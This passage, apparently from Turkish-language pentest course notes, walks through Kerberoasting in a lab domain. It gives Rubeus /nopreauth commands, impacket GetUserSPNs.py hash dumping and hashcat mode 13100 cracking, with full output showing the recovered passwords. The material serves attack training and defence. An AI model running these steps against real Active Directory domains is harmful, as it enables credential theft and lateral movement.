 |_| |_|____/|____/|_____)____/(___/
 v2.2.2
[*] Action: Kerberoasting
[!] Unhandled Rubeus exception:
System.DirectoryServices.ActiveDirectory.ActiveDirectoryOperationException
: Current security context is not associated with an Active Directory
domain or forest.
 at
System.DirectoryServices.ActiveDirectory.DirectoryContext.GetLoggedOnDomai
n()
 at
System.DirectoryServices.ActiveDirectory.DirectoryContext.IsContextValid(D
irectoryContext context, DirectoryContextType contextType)
 at System.DirectoryServices.ActiveDirectory.DirectoryContext.isDomain()
 at
System.DirectoryServices.ActiveDirectory.Domain.GetDomain(DirectoryContext
context)
 at Rubeus.Commands.Kerberoast.Execute(Dictionary`2 arguments)
 at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName,
Dictionary`2 arguments)
 at Rubeus.Program.MainExecute(String commandName, Dictionary`2
parsedArgs)

```

Şimdi, **DONT_REQ_PREAUTH** ayarı yapılmış bir kullanıcı (örneğin, **amber.smith**) ve bir **SPN** (örneğin, **MSSQLSvc/SQL01:1433**) eklersek, bir **ticket** döndürecektir.


### Saldırının /nopreauth ile Gerçekleştirilmesi

```
C:\Tools> Rubeus.exe kerberoast /nopreauth:amber.smith
/domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
 ______ _
 (_____ \ | |
 _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/
 v2.2.2
[*] Action: Kerberoasting
[*] Using amber.smith without pre-auth to request service tickets
[*] Target SPN : MSSQLSvc/SQL01:1433
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Hash :
$krb5tgs$23$*MSSQLSvc/SQL01:1433$inlanefreight.local$MSSQLSvc/SQL01:1433*$
7E08E831C13A2EEAEA47C13ECD378E8D$D6E591A4AB495AFEE4BD9E893A39C7B9E77C3D775
9D9923<SNIP> 
```

Not: Birden fazla SPN denemek için /spn yerine /spns:listofspn.txt kullanabiliriz.

Şimdi, bir Windows host üzerinden **Kerberoasting** nasıl yapılacağını gördük, bundan sonra bir Linux makinesinden nasıl yapılacağına değineceğiz.


## Kerberoasting from Linux

### Linux

Linux'tan **Kerberoasting** gerçekleştirmek için, **[impacket](https://github.com/SecureAuthCorp/impacket)** paketinden **[GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)** aracını kullanacağız. Bu araç, tüm **Kerberoastable** hesapları arayabilir, hizmet hesabının şifresiyle şifrelenmiş veriyi çıkarabilir ve daha sonra çözmek için **hashcat** ile uyumlu bir **hash** döndürebilir.

**`GetUserSPNs.py`** aracını parametresiz çalıştırmak, önceki bölümde geliştirdiğimiz **`PowerShell FindSPNAccounts.ps1`** script'imizle benzer bir çıktı üretecektir.

```
GetUserSPNs.py inlanefreight.local/pixis
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth
Corporation
Password:
ServicePrincipalName Name MemberOf
PasswordLastSet LastLogon Delegation
--------------------------------------- ---------- ---------------------
-------------------------------- -------------------------- --------- -
------------
MSSQL_svc_dev/inlanefreight.local:1443 sqldev CN=Protected
Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:20.558388
<never> unconstrained
MSSQLSvc/sql01:1433 sqlprod CN=Protected
Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:27.558399
<never>
MSSQL_svc_qa/inlanefreight.local:1443 sqlqa CN=Domain
Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:33.792787
<never>
MSSQL_svc_test/inlanefreight.local:1443 sql-test
2020-07-27 20:47:07.574105 <never>
IIS_dev/inlanefreight.local:80 adam.jones
2020-07-27 21:35:57.069094 <never>

```

Artık **`Kerberoastable`** hesapların olduğunu bildiğimize göre, her biri için bir **`TGS ticket`** veya **Service Ticket (ST)** talep edebiliriz ve **-request** parametresiyle **hashcat** (ve **John the Ripper**) formatında kırılabilir bir **hash** elde edebiliriz.

```
GetUserSPNs.py inlanefreight.local/pixis -request

Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth
Corporation
Password:
ServicePrincipalName Name MemberOf
PasswordLastSet LastLogon Delegation
--------------------------------------- ---------- ---------------------
-------------------------------- -------------------------- --------- -
------------
MSSQL_svc_dev/inlanefreight.local:1443 sqldev CN=Protected
Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:20.558388
<never> unconstrained
MSSQLSvc/sql01:1433 sqlprod CN=Protected
Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:27.558399
<never>
MSSQL_svc_qa/inlanefreight.local:1443 sqlqa CN=Domain
Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:33.792787 MSSQL_svc_test/inlanefreight.local:1443 sql-test 2020-07-27 20:47:07.574105 IIS_dev/inlanefreight.local:80 adam.jones 2020-07-27 21:35:57.069094 $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local~ 1443*$f06349cf7220c21cde1236e53a491a67$c4c2079e9b $krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01~1433*$577b69c3a2ab cff0fc3318fd94f90014$9272d9d177c6147a1b773ba12f95 $krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local~14 43*$edaecbbcd610e2dd3ef39d6ea2cb3838$b5dbb92fb35b $krb5tgs$23$*sqltest$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local~1443*$989e43ca 34c03490e7de627135599ab4$832a1d7 $krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local~80 *$2b9cfebc5043606bbebb9f140bdf48cb$c05bf3d19a3e26
```


### Cracking

**GetUserSPNs.py** aracının farklı **Service Tickets (ST)** ile ilişkilendirilmiş **hash** listesini döndürmesinin ardından, bu hesaplarla ilişkilendirilmiş **clear text** şifreyi elde etmek için **hashcat** kullanacağız. Bunun için **hash-mode** 13100 ( **Kerberos 5, etype 23, TGS-REP** ) kullanılacaktır.

```
hashcat -m 13100 hashes.txt rockyou.txt
hashcat (v5.1.0) starting...
<SNIP>
$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local~14
43*$edaecbbcd<SNIP>ec0ef:Welcome1
$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01~1433*$577b69c3a2ab
cff0fc3318fd9<SNIP>7170c:Welcome1
$krb5tgs$23$*sqltest$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local~1443*$989e<SNI
P>9f08c:Welcome1
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local~
1443*$f06349c<SNIP>173ca:Welcome1
<SNIP>
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: hashes.txt
Time.Started.....: Wed Aug 12 15:24:44 2020 (20 secs)
Time.Estimated...: Wed Aug 12 15:25:04 2020 (0 secs)
Guess.Base.......: File (Tools/Cracking/Wordlists/Passwords/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 707.8 kH/s (11.43ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 4/5 (80.00%) Digests, 4/5 (80.00%) Salts
Progress.........: 71721925/71721925 (100.00%)
Rejected.........: 0/71721925 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:4 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[2321686f74746965] ->
$HEX[042a0337c2a156616d6f732103]
```

5 **Kerberoastable** hesap arasında, **hashcat** 4'ünün şifresini buldu: **sqlsa**, **sqlprod**, **sql-test** ve **sqldev**.


## Beyond Roasting Attacks

Şimdi hem **`ASREPRoasting`** hem de **`Kerberoasting`** saldırılarını ele aldığımıza göre, **Kerberos Delegation** dünyasına adım atalım ve karşılaşabileceğimiz üç tür delegasyonu ve bunlarla ilişkilendirilen saldırıları tartışalım.


### Kerberos Delegations

